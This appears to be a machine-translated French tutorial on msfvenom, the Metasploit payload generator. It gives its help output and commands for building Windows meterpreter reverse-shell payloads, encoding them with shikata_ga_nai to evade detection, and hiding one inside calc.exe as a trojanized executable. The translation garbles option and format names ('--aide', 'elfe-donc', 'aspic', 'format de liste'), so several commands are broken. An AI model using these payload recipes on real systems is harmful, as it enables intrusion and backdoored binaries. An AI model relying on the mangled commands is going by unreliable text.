# sec_msfvenom

### Introduction

**msfvenom** est un générateur de charge utile autonome (bombe logique) dans le framework Metasploit.
(2015.6.8 a remplacé les précédents « msfpayload » et « msfencode »)

* Aide sur GitHub
   * [Comment-utiliser-msfvenom](https://github.com/rapid7/metasploit-framework/ wiki/How-to-use-msfvenom)


### informations d'aide

```
msfvenom --aide
MsfVenom - un générateur de charge utile autonome Metasploit.
Également un remplacement pour msfpayload et msfencode.
Utilisation : /usr/bin/msfvenom [options] <var=val>
Exemple : /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Possibilités :
     -l, --list <type> Répertorie tous les modules pour [type]. Les types sont : charges utiles, encodeurs, nops, plates-formes, archs, chiffrement, formats, tous
     -p, --payload <payload> Charge utile à utiliser (--list charges utiles à lister, --list-options pour les arguments). Spécifiez '-' ou STDIN pour la personnalisation
         --list-options Liste les options standard, avancées et d'évolution de --payload <value>
     -f, --format <format> Format de sortie (utilisez les formats --list pour lister)
     -e, --encoder <encoder> L'encodeur à utiliser (utilisez --list encoders pour lister)
         --sec-name <valeur> Le nouveau nom de section à utiliser lors de la génération de fichiers binaires Windows volumineux. Par défaut : chaîne alphabétique aléatoire de 4 caractères.
         --smallest Génère la plus petite charge utile possible en utilisant tous les encodeurs disponibles
         --encrypt <value> Le type de cryptage ou d'encodage à appliquer au shellcode (utilisez --list encrypt pour lister)
         --encrypt-key <value> Une clé à utiliser pour --encrypt
         --encrypt-iv <value> Un vecteur d'initialisation pour --encrypt
     -a, --arch <arch> L'architecture à utiliser pour --payload et --encoders (utilisez --list archs pour lister)
         --platform <platform> La plateforme pour --payload (utilisez --list platform pour lister)
     -o, --out <path> Enregistre la charge utile dans un fichier
     -b, --bad-chars <list> Caractères à éviter, exemple : '\x00\xff'
     -n, --nopsled <longueur> Ajouter un nopsled de taille [longueur] à la charge utile
         --pad-nops Utiliser la taille nopsled spécifiée par -n <length> comme taille totale de la charge utile, en ajoutant automatiquement un nopsled de quantité (nops moins la longueur de la charge utile)
     -s, --space <length> La taille maximale de la charge utile résultante
         --encoder-space <length> La taille maximale de la charge utile encodée (valeur par défaut -s)
     -i, --iterations <count> Le nombre de fois où encoder la charge utile
     -c, --add-code <path> Spécifie un fichier shellcode win32 supplémentaire à inclure
     -x, --template <path> Spécifie un fichier exécutable personnalisé à utiliser comme modèle
     -k, --keep Préserve le comportement de --template et injecte la charge utile en tant que nouveau thread
     -v, --var-name <value> Spécifie un nom de variable personnalisé à utiliser pour certains formats de sortie
     -t, --timeout <second> Le nombre de secondes à attendre lors de la lecture de la charge utile depuis STDIN (par défaut 30, 0 pour désactiver)
     -h, --help Afficher ce message
```


### Générer une charge utile - instructions de base

* Le type 1 génère une charge utile normale sans encodage (pas d'encodage -> contenu généré fixe -> directement tué)

```bash
#Format
msfvenom --payload <charge utile> <options de charge utile> -f <format> -o <chemin>
# exemple
msfvenom --payload windows/meterpreter/reverse_tcp -f c -o 1.c
```

* Le type 2 génère une charge utile après avoir été traité par l'encodeur

```bash
#Format
msfvenom --payload <payload> -e <encoder> -i <encoder times> -n <nopsled> -f <format> -o <path>
# exemple
msfvenom --payload windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o C:\back.exe
```

* Le type 3 est regroupé dans un fichier normal pour générer une charge utile (la question de savoir si le paramètre -e peut être ajouté n'a pas encore été testée)

```bash
Msfvenom --payload windows/meterpreter/reverse_tcp -platform windows -a x86 -x C:\calc.exe -k -f exe -o C:\shell.exe
```


### --payload [Spécifiez le nom de la charge utile de l'attaque]

Pour générer la charge utile, au moins --payload et -f doivent être spécifiés

* --charge utile
   * Vous pouvez spécifier le nom de la charge utile fourni avec msfvenom, tel que `--payload windows/meterpreter/reverse_tcp`
   * Vous pouvez spécifier une charge utile personnalisée telle que `cat custom_payload_shellcode.bin | msfvenom --payload - -a x86 --platform win -e x86/shikata_ga_nai -f raw -o shellcode_encoded.bin`

Les noms de toutes les charges utiles d'attaque font référence aux charges utiles msfvenom à la fin de cet article.
 

### -f [Spécifiez le format de fichier de sortie de la charge utile]

* -f prend en charge la sortie de différents formats de fichiers
   * Format exécutable (pour exécution directe)
     * `-f exe` génère un programme exécutable Windows
     * `-f exe uniquement`
     * `-f msi`
     * `-f vba` Générer des programmes exécutables Visual Basic pour Applications (un langage de programmation simple et puissant qui peut être utilisé pour étendre les applications Office) Référence [Démarrage d'Office VBA | Microsoft Docs](https://docs.microsoft.com / zh-cn/office/vba/library-reference/concepts/getting-started-with-vba-in-office)
     * `-f elf` génère un programme exécutable Linux
     * `-f elfe-donc`
     * `-f macho` génère un programme exécutable macOS/iOS
     * `-f osx-app`
     * `-f pot`
     *...
   * Format convertible (pour une utilisation personnalisée)
     * `-f raw` génère le format de sortie par défaut au format natif lorsque -f n'est pas spécifié
     * `-f hex` génère un codage hexadécimal tel que `\x0a`
     * `-f python`
     * `-fc`
     * `-f csharp` génère du code C#
     * `-f powershell`
     * `-f bash`
     * `-f sh`
     *...



Tous les formats de sortie
```bash
msfvenom --format de liste

Formats exécutables du framework [--format <valeur>]
===================================================

     nom
     ----
     aspic
     aspx
     aspx-exe
     axe2
     dll
     elfe
     elfe-donc
     exe
     exe-on
